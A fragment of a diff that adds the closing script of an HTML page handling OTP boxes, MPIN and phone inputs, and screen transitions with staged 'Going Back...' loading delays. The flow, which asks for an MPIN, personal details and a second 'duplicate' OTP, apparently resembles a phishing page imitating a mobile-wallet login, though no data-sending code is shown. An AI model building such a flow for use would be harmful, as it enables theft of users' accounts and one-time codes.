+            input.addEventListener('keydown', function(e) {
+                if (e.key === 'Backspace' && this.value.length === 0 && index > 0) {
+                    otpBoxesDup[index - 1].focus();
+                }
+            });
+        });
+
+        function checkAllFilled(boxes, callback) {
+            let filled = true;
+            boxes.forEach(b => { if (b.value.trim() === '') filled = false; });
+            if (filled) callback();
+        }
+
+        function goBackToLogin() {
+            showLoading("Going Back...", 1500, () => {
+                screenOtpFirst.classList.add('hidden');
+                screenOtpFirst.style.display = 'none';
+                screenLogin.classList.remove('hidden');
+                screenLogin.style.display = 'flex';
+            });
+        }
+
+        function goBackToPersonal() {
+            showLoading("Going Back...", 1500, () => {
+                screenOtpDup.classList.add('hidden');
+                screenOtpDup.style.display = 'none';
+                screenPersonal.classList.remove('hidden');
+                screenPersonal.style.display = 'flex';
+            });
+        }
+
+        mpinInput.addEventListener('input', function() {
+            this.value = this.value.replace(/[^0-9]/g, '');
+        });
+        phoneInput.addEventListener('input', function() {
+            this.value = this.value.replace(/[^0-9]/g, '');
+        });
+        personalMobile.addEventListener('input', function() {
+            this.value = this.value.replace(/[^0-9+]/g, '');
+        });
+
+        window.goToMPin = goToMPin;
+        window.goToFirstOTP = goToFirstOTP;
+        window.goToDuplicateOTP = goToDuplicateOTP;
+        window.goBackToLogin = goBackToLogin;
+        window.goBackToPersonal = goBackToPersonal;
+    </script>
+</body>
+</html>
